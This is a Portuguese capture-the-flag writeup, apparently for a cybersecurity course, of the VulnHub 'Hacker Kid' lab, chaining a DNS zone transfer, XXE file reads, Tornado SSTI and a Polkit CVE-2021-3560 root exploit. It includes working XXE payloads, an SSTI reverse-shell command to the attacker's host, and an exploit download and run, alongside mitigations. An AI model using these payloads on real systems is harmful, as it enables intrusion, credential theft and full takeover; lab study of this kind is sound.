# Hacker Kid (VulnHub) — Writeup

Walkthrough completo de reconhecimento e exploração da máquina vulnerável **"Hacker Kid: 1.0.1"** (VulnHub), do reconhecimento inicial até à obtenção de acesso root, encadeando falha de configuração de DNS, XXE (XML External Entity), SSTI (Server-Side Template Injection) e escalada de privilégios via CVE-2021-3560 (Polkit).

## Índice

- [Sumário executivo](#sumário-executivo)
- [Ambiente](#ambiente)
- [1. Reconhecimento de rede](#1-reconhecimento-de-rede)
- [2. Varrimento de portas e serviços](#2-varrimento-de-portas-e-serviços)
- [3. Enumeração web (porta 80)](#3-enumeração-web-porta-80)
- [4. Enumeração DNS](#4-enumeração-dns)
- [5. Exploração — XXE (XML External Entity)](#5-exploração--xxe-xml-external-entity)
- [6. Autenticação na aplicação Tornado (porta 9999)](#6-autenticação-na-aplicação-tornado-porta-9999)
- [7. Exploração — SSTI (Server-Side Template Injection)](#7-exploração--ssti-server-side-template-injection)
- [8. Escalada de privilégios — CVE-2021-3560 (Polkit)](#8-escalada-de-privilégios--cve-2021-3560-polkit)
- [9. Cadeia de ataque (resumo visual)](#9-cadeia-de-ataque-resumo-visual)
- [10. Mitigações](#10-mitigações)
- [11. Lições aprendidas](#11-lições-aprendidas)
- [Ficheiros neste repositório](#ficheiros-neste-repositório)

---

## Sumário executivo

| | |
|---|---|
| **Alvo** | Hacker Kid: 1.0.1 (VulnHub), Ubuntu Linux |
| **Atacante** | Kali Linux 2026.2 |
| **Rede** | 192.168.1.0/24 (isolada, VMware) |
| **Resultado final** | Shell root via CVE-2021-3560 (Polkit local privilege escalation) |
| **Vulnerabilidades exploradas** | Zone Transfer (AXFR) mal configurado, XML External Entity (XXE), Server-Side Template Injection (SSTI), Local Privilege Escalation (Polkit) |
| **CVEs** | CVE-2021-3560 |

A máquina apresenta uma página inicial com uma pista textual ("DIG me more") que conduz à enumeração DNS. Um Zone Transfer (AXFR) mal configurado no servidor BIND revela o domínio interno `blackhat.local` e, através de um registo SOA, o subdomínio `hackerkid.blackhat.local` — um virtual host Apache não descoberto por enumeração de diretórios nem por brute-force de subdomínios convencional. Esse subdomínio aloja um formulário de registo vulnerável a XXE, que permite ler ficheiros arbitrários do sistema, incluindo credenciais deixadas propositadamente no `.bashrc` de um utilizador. Essas credenciais autenticam numa segunda aplicação web (Tornado, porta 9999) vulnerável a SSTI, que permite execução remota de comandos e obtenção de shell. A escalada para root explora uma vulnerabilidade conhecida (CVE-2021-3560) no Polkit, através da criação de um novo utilizador administrador via D-Bus.

## Ambiente

- **Hypervisor:** VMware Workstation Pro
- **Rede:** LAN interna isolada `192.168.1.0/24`, com OPNsense como gateway (sem necessidade de acesso à internet para o exercício)
- **Kali:** `192.168.1.125`
- **Alvo (Hacker Kid):** IP dinâmico por DHCP (observado em `192.168.1.138` e `192.168.1.150` em sessões diferentes — os exemplos abaixo usam o IP da sessão em que cada passo foi executado)

## 1. Reconhecimento de rede

Sem informação prévia sobre o alvo (nem nome, nem IP, nem credenciais), o primeiro passo foi identificar o host na rede de testes.

```bash
ip a                                    # confirmar IP/sub-rede próprios
nmap -sn 192.168.1.0/24                 # ping sweep
sudo arp-scan --interface=eth0 192.168.1.0/24   # descoberta a nível ARP (mais fiável)
```

Resultado: identificado o alvo pelo MAC address da VM (confirmado nas definições de rede do VMware), distinguindo-o da OPNsense.

## 2. Varrimento de portas e serviços

```bash
nmap -sV -sC -p- <IP_ALVO>
```

```
PORT     STATE SERVICE VERSION
53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
9999/tcp open  http    Tornado httpd 6.1
```

Três serviços expostos: DNS, um servidor web Apache tradicional, e uma aplicação Python (Tornado) numa porta não convencional.

## 3. Enumeração web (porta 80)

A página inicial apresenta uma mensagem de um "hacker" fictício com uma pista explícita:

> "More you will DIG me, more you will find me on your servers..DIG me more...DIG me more"

Enumeração de diretórios:

```bash
gobuster dir -u http://<IP_ALVO>/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Resultado: `index.php`, `app.html`, `form.html` — todas páginas de template genérico do Bootstrap, sem relevância direta (confirmadas como *red herring*/distração).

O código-fonte de `index.php` contém o comentário:

```html
<!-- TO DO: Use a GET parameter page_no to view pages. -->
```

**Nota metodológica:** este parâmetro revelou-se também um red herring — a resposta do servidor é estática e idêntica independentemente do valor de `page_no`, com uma exceção: um brute-force sistemático de valores numéricos (`page_no=1` a `500`, comparando o tamanho da resposta) revelou que `page_no=21` devolve uma mensagem escondida (texto branco/vermelho sobre fundo escuro, invisível a olho nu no browser, mas visível via `curl`) com a pista textual do subdomínio-chave (ver secção seguinte).

```bash
for i in $(seq 1 500); do
  size=$(curl -s -o /dev/null -w "%{size_download}" "http://<IP_ALVO>/index.php?page_no=$i")
  if [ "$size" != "3654" ]; then echo "page_no=$i -> $size bytes"; fi
done
```

## 4. Enumeração DNS

Seguindo a pista "DIG me more", foi explorado o serviço BIND (porta 53) diretamente:

```bash
dig axfr @<IP_ALVO> 168.192.in-addr.arpa      # zone reversa da rede — revela sub-zona delegada
dig axfr @<IP_ALVO> 14.168.192.in-addr.arpa   # sub-zona reversa — revela o domínio blackhat.local
dig axfr @<IP_ALVO> blackhat.local            # zone transfer completa do domínio
```

O AXFR (Zone Transfer) estava mal configurado e permitiu obter a lista completa da zona `blackhat.local`:

```
blackhat.local.         SOA     blackhat.local. hackerkid.blackhat.local. ...
blackhat.local.         NS      ns1.blackhat.local.
blackhat.local.         MX      10 mail.blackhat.local.
blackhat.local.         A       192.168.14.143
ftp.blackhat.local.     CNAME   blackhat.local.
hacker.blackhat.local.  CNAME   hacker.blackhat.local.blackhat.local.
mail.blackhat.local.    A       192.168.14.143
ns1/ns2.blackhat.local. A       192.168.14.143
www.blackhat.local.     CNAME   blackhat.local.
```

**Ponto-chave (facilmente ignorado):** o campo de contacto do registo SOA — `hackerkid.blackhat.local` — não é apenas metadado técnico de DNS; é, na verdade, o **subdomínio real com o formulário de registo vulnerável**, confirmado ao testá-lo diretamente como cabeçalho `Host` no Apache:

```bash
curl -s -H "Host: hackerkid.blackhat.local" http://<IP_ALVO>/
```

Este subdomínio não é descoberto por vhost fuzzing convencional (wordlists genéricas) nem consta explicitamente como registo A/CNAME na zona — só é revelado por atenção ao campo de contacto do SOA.

## 5. Exploração — XXE (XML External Entity)

O subdomínio `hackerkid.blackhat.local` apresenta um formulário de registo ("Create Account"). A inspeção do código-fonte revela que os campos são montados em XML no browser (via JavaScript) e enviados por `POST` para `process.php`:

```javascript
var xml = '<?xml version="1.0" encoding="UTF-8"?>' +
    '<root>' +
    '<name>' + $('#name').val() + '</name>' +
    '<tel>' + $('#tel').val() + '</tel>' +
    '<email>' + $('#email').val() + '</email>' +
    '<password>' + $('#password').val() + '</password>' +
    '</root>';
xmlhttp.open("POST", "process.php", true);
```

Este padrão — dados de formulário serializados como XML e processados no servidor — é um candidato clássico a XXE se o parser não desativar o processamento de entidades externas.

### 5.1 Confirmação da vulnerabilidade

Payload construído com uma entidade externa a apontar para `/etc/passwd`, usando o wrapper PHP `php://filter` para obter o conteúdo em base64 (o wrapper `file://` direto não produziu resultado):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM
  "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root>
<name></name><tel></tel>
<email>&xxe;</email>
<password></password>
</root>
```

```bash
curl -s -X POST -H "Host: hackerkid.blackhat.local" -H "Content-Type: application/xml" \
  --data-binary @payload.xml http://<IP_ALVO>/process.php
```

**Nota importante:** a entidade `&xxe;` tem de estar dentro do campo `<email>`, não do `<name>` — colocá-la no campo errado produz sempre a mesma mensagem de erro genérica ("is not available"), relativa à validação de disponibilidade do email, o que pode induzir em erro na primeira tentativa.

Resultado: o `/etc/passwd` descodificado revelou a existência do utilizador **`saket`** (`/home/saket`, `/bin/bash`).

### 5.2 Obtenção de credenciais via `.bashrc`

Repetindo o ataque, apontando a entidade para o ficheiro `.bashrc` do utilizador `saket`:

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/home/saket/.bashrc">
```

O `.bashrc` descodificado continha, nas últimas linhas, um comentário do autor do desafio:

```bash
#Setting Password for running python app
username="admin"
password="Saket!#$%@!!"
```

**Armadilha do exercício:** o `username="admin"` indicado no comentário **não é o utilizador correto** — a aplicação Tornado exige o username real, `saket` (o autor identifica-se a si próprio em vários pontos do desafio), mantendo a mesma password.

## 6. Autenticação na aplicação Tornado (porta 9999)

A aplicação usa proteção XSRF (token de uso único ligado à sessão via cookie), pelo que a autenticação por `curl` exige capturar o cookie de sessão e o valor do campo oculto `_xsrf` antes do `POST`:

```bash
curl -s -c cookies.txt http://<IP_ALVO>:9999/login | grep _xsrf
# extrai o valor de _xsrf da resposta

curl -s -i -b cookies.txt -c cookies.txt -X POST http://<IP_ALVO>:9999/login \
  --data-urlencode "username=saket" \
  --data-urlencode "password=Saket!#\$%@!!" \
  -d "_xsrf=<TOKEN_EXTRAÍDO>"
```

Resultado: `HTTP/1.1 302 Found`, `Location: /`, cookie de sessão `user` atribuído — autenticação bem-sucedida.

> **Nota de shell:** em zsh, o carácter `!` na password é interpretado como expansão de histórico e corrompe o comando ao colar. Resolvido com `setopt no_bang_hist` antes de correr o `curl`.

## 7. Exploração — SSTI (Server-Side Template Injection)

A página principal (autenticada) aceita um parâmetro GET `name` e reflete o valor diretamente na resposta — sinal típico de SSTI:

```bash
curl -s -b cookies.txt --get "http://<IP_ALVO>:9999/" --data-urlencode "name={{7*7}}"
```

Resposta: `Hello 49` — a expressão foi avaliada pelo motor de templates do Tornado, confirmando SSTI.

### 7.1 Execução remota de comandos e shell reversa

O Tornado permite importar módulos Python dentro do próprio template com `{% import ... %}`. Explorado para importar `os` e invocar `os.system()`, lançando uma shell reversa para um listener `netcat` na Kali:

```bash
# Terminal 1 (Kali) — listener
nc -nvlp 4444

# Terminal 2 (Kali) — payload SSTI
curl -s -b cookies.txt --get "http://<IP_ALVO>:9999/" \
  --data-urlencode 'name={% import os %}{{os.system(
  "bash -c \"bash -i >& /dev/tcp/<IP_KALI>/4444 0>&1\"") }}'
```

Shell obtida como `saket`. Estabilização com PTY completo:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

**Cuidado operacional:** interromper esta shell com `Ctrl+C` no lado do atacante pode deixar o processo `os.system()` bloqueado do lado do servidor (o Tornado processa pedidos de forma sequencial numa única thread por defeito), tornando a aplicação inteira sem resposta até reiniciar a VM. Preferir sempre `exit` dentro da shell remota.

## 8. Escalada de privilégios — CVE-2021-3560 (Polkit)

Confirmado que a password de `saket` (`Saket!#$%@!!`) é válida **apenas** para a aplicação web — falha tanto em `su -` como em `sudo -l` ao nível do sistema operativo (as credenciais foram deixadas propositadamente só para a app Python, como o próprio comentário no `.bashrc` indicava).

Reconhecimento de vetores sem depender de password:

```bash
find / -perm -4000 -type f 2>/dev/null   # binários SUID
```

Dois binários SUID chamaram a atenção pelas versões:

```bash
sudo --version      # Sudo version 1.8.31
pkexec --version     # pkexec version 0.105
```

A versão do Polkit (`0.105-26`) corresponde a uma vulnerabilidade local de escalada de privilégios conhecida:

```bash
searchsploit polkit
# Polkit 0.105-26 0.117-2 - Local Privilege Escalation | linux/local/50011.sh  (CVE-2021-3560)

searchsploit -m linux/local/50011.sh
```

### 8.1 Transferência e execução do exploit

```bash
# Na Kali
python3 -m http.server 8000

# Na shell da máquina vulnerável
cd /tmp
wget http://<IP_KALI>:8000/50011.sh
chmod +x 50011.sh
./50011.sh
```

O script recusou-se a correr com o aviso: *"SSH into localhost first before running this script"* — uma verificação superficial que apenas confirma se as variáveis de ambiente `$SSH_CLIENT` e `$SSH_TTY` estão definidas (não valida SSH real). Contornado sem necessidade de SSH:

```bash
export SSH_CLIENT="127.0.0.1 1 22"
export SSH_TTY="/dev/pts/0"
./50011.sh
```

O exploit (CVE-2021-3560) abusa de uma condição de corrida no D-Bus/`accountsservice` para criar um novo utilizador administrador (`hacked`, password `password`) antes de o Polkit validar corretamente o pedido:

```
[*] New user hacked created with uid of 1001
[*] Adding password to /etc/shadow and enabling user
[*] Exploit complete!
```

### 8.2 Root

```bash
su - hacked        # password: password
sudo su
whoami              # root
```

Acesso root confirmado.

## 9. Cadeia de ataque (resumo visual)

```mermaid
flowchart TD
    A[Reconhecimento de rede\nnmap / arp-scan] --> B[Varrimento de portas\n53 DNS, 80 HTTP, 9999 Tornado]
    B --> C[Enumeração web\nred herrings: page_no, Bootstrap templates]
    B --> D[Enumeração DNS\nAXFR mal configurado]
    D --> E[Descoberta do domínio blackhat.local\ne subdomínio hackerkid.blackhat.local\nvia campo SOA]
    E --> F[XXE no formulário de registo\nprocess.php]
    F --> G[Leitura de /etc/passwd\ne .bashrc via php://filter]
    G --> H[Credenciais saket / Saket!#$%@!!]
    H --> I[Login na app Tornado\nporta 9999]
    I --> J[SSTI confirmado\nname={{7*7}}]
    J --> K[Shell reversa\nos.system via SSTI]
    K --> L[Shell como saket]
    L --> M[Binário SUID pkexec 0.105\nvulnerável a CVE-2021-3560]
    M --> N[Exploit cria utilizador admin\nvia D-Bus/Polkit]
    N --> O[Root]
```

## 10. Mitigações

| Vulnerabilidade | Mitigação recomendada |
|---|---|
| Zone Transfer (AXFR) aberto | Restringir AXFR apenas a servidores DNS secundários autorizados (`allow-transfer` no BIND); nunca deixar aberto a qualquer origem |
| Informação sensível em registos SOA/comentários DNS | Não usar subdomínios ou nomes reais de infraestrutura em campos de contacto/metadados DNS |
| XXE | Desativar resolução de entidades externas no parser XML (`libxml_disable_entity_loader(true)` em PHP, ou configuração equivalente noutras linguagens); validar/sanitizar todo o input XML; preferir formatos como JSON quando a estrutura de entidades externas não é necessária |
| Credenciais em ficheiros de configuração de shell (`.bashrc`) | Nunca armazenar credenciais em texto simples em ficheiros de perfil de utilizador; usar gestores de segredos (Vault, variáveis de ambiente geridas, etc.) |
| SSTI | Nunca renderizar input do utilizador diretamente como template; usar sempre autoescaping e separar dados de lógica de apresentação |
| Binários SUID desatualizados (Polkit/CVE-2021-3560) | Manter o sistema atualizado com patches de segurança; auditar periodicamente binários SUID com `find / -perm -4000`; aplicar o princípio do menor privilégio |
| Falta de segmentação/hardening geral | Revisão de superfície de ataque completa (serviços expostos desnecessariamente, como a porta DNS acessível externamente numa máquina que não precisa de ser servidor DNS público) |

## 11. Lições aprendidas

- A pista textual da página inicial ("DIG me more") era literal e conduzia diretamente à técnica correta (enumeração DNS), mas exigiu persistência com vários subdomínios candidatos antes de se encontrar o AXFR mal configurado.
- Nem toda a pista aparente é real: o parâmetro `page_no` em `index.php` e os templates Bootstrap (`app.html`, `form.html`) eram *red herrings* — confirmado por comparação de respostas via `curl` em vez de inspeção visual no browser, que pode esconder diferenças subtis (texto colorido sobre fundo escuro).
- A informação mais valiosa nem sempre está nos registos DNS óbvios (A/CNAME) — o campo de contacto do SOA revelou o subdomínio-chave.
- O erro do servidor no XXE ("is not available") estava associado à validação do campo email, não ao nome — um detalhe fácil de ignorar que atrasa a primeira tentativa de exploração.
- Credenciais encontradas num ficheiro não são necessariamente válidas ao nível do sistema operativo — neste caso, funcionavam apenas para a aplicação web, uma distinção confirmada por tentativa direta (`su`, `sudo -l`).
- Scripts de exploit público podem ter verificações superficiais (como a checagem de `$SSH_CLIENT`/`$SSH_TTY`) que são contornáveis sem comprometer o exploit em si — vale a pena ler o código-fonte do exploit antes de o descartar por um aviso.
- Interromper uma shell reversa com `Ctrl+C` pode bloquear o processo do lado do servidor (especialmente em aplicações single-threaded como o Tornado por defeito); usar sempre `exit` para encerrar de forma limpa.
- A combinação de duas vulnerabilidades web distintas (XXE para reconhecimento/credenciais, SSTI para execução remota de código) ilustra como, num pentest real, o acesso inicial raramente vem de uma única falha isolada, mas de uma cadeia de pequenas fugas de informação.

## Ficheiros neste repositório

- [`payloads/payload-etc-passwd.xml`](payloads/payload-etc-passwd.xml) — payload XXE para leitura de `/etc/passwd`
- [`payloads/payload-bashrc.xml`](payloads/payload-bashrc.xml) — payload XXE para leitura do `.bashrc` do utilizador `saket`
- [`scripts/page_no_bruteforce.sh`](scripts/page_no_bruteforce.sh) — script de brute-force do parâmetro `page_no`

---

*Writeup elaborado no âmbito do CET em Cibersegurança — IEFP de Alcoitão. Máquina fornecida pelo formador para fins pedagógicos, em ambiente de laboratório isolado.*
